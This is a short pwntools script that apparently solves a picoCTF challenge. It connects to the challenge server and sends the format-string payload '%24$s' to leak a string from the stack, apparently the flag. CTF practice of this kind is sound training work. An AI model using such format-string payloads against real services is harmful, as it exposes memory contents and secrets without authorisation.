#!/usr/bin/python3
from pwn import *
import sys

elf = ELF('./vuln')

#io = elf.process()
io = remote(b"saturn.picoctf.net", 61079)

# Offset starts at 4
payload = b""
payload += b"%24$s"

io.recv()

io.sendline(payload)

io.recvline()

print(io.recv())
